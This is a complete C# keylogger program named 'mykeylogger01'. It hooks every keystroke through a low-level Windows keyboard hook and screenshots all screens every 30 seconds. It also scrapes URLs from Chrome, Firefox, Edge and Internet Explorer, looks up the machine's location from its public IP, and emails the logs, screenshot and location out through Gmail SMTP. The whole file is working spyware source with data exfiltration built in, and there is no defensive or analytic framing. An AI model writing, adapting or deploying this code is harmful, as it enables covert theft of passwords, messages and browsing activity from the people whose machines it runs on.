using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;
using System.Drawing;
using Newtonsoft.Json.Linq;
using System.Windows.Automation;

namespace mykeylogger01
{
    class Program
    {
        // Environment variables to retrieve email details
        private static readonly string EMAIL_ADDRESS = Environment.GetEnvironmentVariable("EMAIL_ADDRESS");
        private static readonly string EMAIL_PASSWORD = Environment.GetEnvironmentVariable("EMAIL_PASSWORD");
        private const string LOG_FILE_NAME = @"C:\Users\public\mylog.txt";
        private const string ARCHIVE_FILE_NAME = @"C:\Users\Public\mylog_archive.txt";
        private const string SCREENSHOT_FILE_NAME = @"C:\Users\Public\screenshot.jpg";
        private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
        private const bool INCLUDE_SCREENSHOT_AS_ATTACHMENT = true;
        private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 400;
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 50;

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static string buffer = "";

        static void Main(string[] args)
        {
            if (string.IsNullOrEmpty(EMAIL_ADDRESS) || string.IsNullOrEmpty(EMAIL_PASSWORD))
            {
                Console.WriteLine("Error: Environment variables EMAIL_ADDRESS and EMAIL_PASSWORD must be set.");
                Console.WriteLine("Press Enter to exit...");
                Console.ReadLine();
                return;
            }

            hook = SetHook(llkProcedure);
            StartScreenshotCapture();
            new Thread(TrackURLs).Start(); // Start tracking URLs in a separate thread
            Application.Run();
            UnhookWindowsHookEx(hook);

            Console.WriteLine("Press Enter to exit...");
            Console.ReadLine();
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();

                // Print the keystroke to the console immediately
                PrintToConsole(key, ConsoleColor.Red);

                // Write the keystroke to the log file
                WriteToLogFile(key);

                CheckLogFileSize();
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }



        private static void WriteBufferToLog()
        {
            try
            {
                using (StreamWriter output = new StreamWriter(LOG_FILE_NAME, true))
                {
                    output.Write(buffer + " "); // Add a space after each keystroke
                }
                buffer = ""; // Clear the buffer after writing to log
                Console.WriteLine(); // Print a new line to separate the keystrokes
            }
            catch (Exception e)
            {
                PrintToConsole($"Error writing to log: {e.Message}", ConsoleColor.Red);
            }
        }
        private static void CheckLogFileSize()
        {
            FileInfo logFile = new FileInfo(LOG_FILE_NAME);

            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
            {
                ArchiveAndEmailLogFile();
            }
        }

        private static void ArchiveAndEmailLogFile()
        {
            try
            {
                File.Copy(LOG_FILE_NAME, ARCHIVE_FILE_NAME, true);
                File.Delete(LOG_FILE_NAME);

                Thread mailThread = new Thread(SendMail);
                mailThread.Start();
            }
            catch (Exception e)
            {
                PrintToConsole($"Error archiving or emailing log: {e.Message}", ConsoleColor.Red);
            }
        }

        public static void SendMail()
        {
            try
            {
                string emailBody;
                string locationInfo = GetLocationInfo();

                using (StreamReader input = new StreamReader(ARCHIVE_FILE_NAME))
                {
                    emailBody = input.ReadToEnd();
                }

                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(EMAIL_ADDRESS, EMAIL_PASSWORD),
                    EnableSsl = true,
                };

                MailMessage message = new MailMessage
                {
                    From = new MailAddress(EMAIL_ADDRESS),
                    Subject = $"{Environment.UserName} - {DateTime.Now:MM.dd.yyyy}",
                    Body = $"<html><body>" +
                           $"<h2>Keystrokes and URL Logs</h2><pre>{emailBody}</pre>" +
                           $"<h2>Location Information</h2><p>{locationInfo}</p>" +
                           $"</body></html>",
                    IsBodyHtml = true,
                };

                if (INCLUDE_LOG_AS_ATTACHMENT)
                {
                    Attachment attachment = new Attachment(ARCHIVE_FILE_NAME, System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                if (INCLUDE_SCREENSHOT_AS_ATTACHMENT)
                {
                    Attachment screenshotAttachment = new Attachment(SCREENSHOT_FILE_NAME);
                    message.Attachments.Add(screenshotAttachment);
                }

                message.To.Add(EMAIL_ADDRESS);
                client.Send(message);
                message.Dispose();
            }
            catch (Exception e)
            {
                PrintToConsole($"Error sending email: {e.Message}", ConsoleColor.Red);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process currentProcess = Process.GetCurrentProcess())
            using (ProcessModule currentModule = currentProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, GetModuleHandle(currentModule.ModuleName), 0);
            }
        }

        private static void StartScreenshotCapture()
        {
            System.Threading.Timer timer = new System.Threading.Timer(CaptureScreenshot, null, TimeSpan.Zero, TimeSpan.FromSeconds(30));
        }

        private static void CaptureScreenshot(object state)
        {
            try
            {
                Rectangle bounds = GetScreenBounds();
                using (Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics graphics = Graphics.FromImage(screenshot))
                    {
                        graphics.CopyFromScreen(bounds.Location, Point.Empty, bounds.Size);
                    }
                    screenshot.Save(SCREENSHOT_FILE_NAME, System.Drawing.Imaging.ImageFormat.Jpeg);
                }
            }
            catch (Exception e)
            {
                PrintToConsole($"Error capturing screenshot: {e.Message}", ConsoleColor.Red);
            }
        }

        private static Rectangle GetScreenBounds()
        {
            Rectangle bounds = new Rectangle();

            foreach (Screen screen in Screen.AllScreens)
            {
                bounds = Rectangle.Union(bounds, screen.Bounds);
            }

            return bounds;
        }

        public static string GetLocationInfo()
        {
            try
            {
                string ip = new WebClient().DownloadString("http://icanhazip.com").Trim();
                string apiUrl = $"http://ip-api.com/json/{ip}?fields=country,city,lat,lon";

                using (WebClient client = new WebClient())
                {
                    string json = client.DownloadString(apiUrl);
                    JObject obj = JObject.Parse(json);
                    string country = (string)obj["country"];
                    string city = (string)obj["city"];
                    double latitude = (double)obj["lat"];
                    double longitude = (double)obj["lon"];

                    return $"Country: {country}, City: {city}, Latitude: {latitude}, Longitude: {longitude}";
                }
            }
            catch (Exception e)
            {
                PrintToConsole($"Error getting location info: {e.Message}", ConsoleColor.Red);
                return "Unknown Location";
            }
        }

        private static void PrintToConsole(string message, ConsoleColor color)
        {
            Console.ForegroundColor = color;
            Console.Write(message); // Write the message without a new line
            Console.ResetColor();
        }




        // Method to track URLs
        private static void TrackURLs()
        {
            while (true)
            {
                string url = GetActiveBrowserURL();
                if (!string.IsNullOrEmpty(url))
                {
                    PrintToConsole($"[URL] {url} - {DateTime.Now}\n", ConsoleColor.Green);
                    WriteToLogFile($"[URL] {url} - {DateTime.Now}\n");
                }

                if (!string.IsNullOrEmpty(buffer))
                {
                    PrintToConsole(buffer, ConsoleColor.Red); // Print the buffer to console horizontally in red color
                    WriteToLogFile(buffer);
                    buffer = ""; // Clear the buffer after writing to log
                }

                Thread.Sleep(10000); // Check every 10 seconds
            }
        }


        private static string GetActiveBrowserURL()
        {
            try
            {
                foreach (Process process in Process.GetProcessesByName("chrome"))
                {
                    if (process.MainWindowHandle != IntPtr.Zero)
                    {
                        return GetURLFromProcess(process);
                    }
                }

                foreach (Process process in Process.GetProcessesByName("firefox"))
                {
                    if (process.MainWindowHandle != IntPtr.Zero)
                    {
                        return GetURLFromProcess(process);
                    }
                }

                foreach (Process process in Process.GetProcessesByName("iexplore"))
                {
                    if (process.MainWindowHandle != IntPtr.Zero)
                    {
                        return GetURLFromProcess(process);
                    }
                }

                foreach (Process process in Process.GetProcessesByName("msedge"))
                {
                    if (process.MainWindowHandle != IntPtr.Zero)
                    {
                        return GetURLFromProcess(process);
                    }
                }
            }
            catch (Exception e)
            {
                PrintToConsole($"Error getting active browser URL: {e.Message}", ConsoleColor.Red);
            }

            return null;
        }

        private static string GetURLFromProcess(Process process)
        {
            try
            {
                AutomationElement element = AutomationElement.FromHandle(process.MainWindowHandle);
                if (element != null)
                {
                    AutomationElement urlBar = element.FindFirst(TreeScope.Descendants,
                        new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                    if (urlBar != null)
                    {
                        return ((ValuePattern)urlBar.GetCurrentPattern(ValuePattern.Pattern)).Current.Value as string;
                    }
                }
            }
            catch (Exception e)
            {
                PrintToConsole($"Error getting URL from process: {e.Message}", ConsoleColor.Red);
            }

            return null;
        }

        private static void WriteToLogFile(string content)
        {
            try
            {
                using (StreamWriter output = new StreamWriter(LOG_FILE_NAME, true))
                {
                    output.Write(content);
                }
            }
            catch (Exception e)
            {
                PrintToConsole($"Error writing to log file: {e.Message}", ConsoleColor.Red);
            }
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}

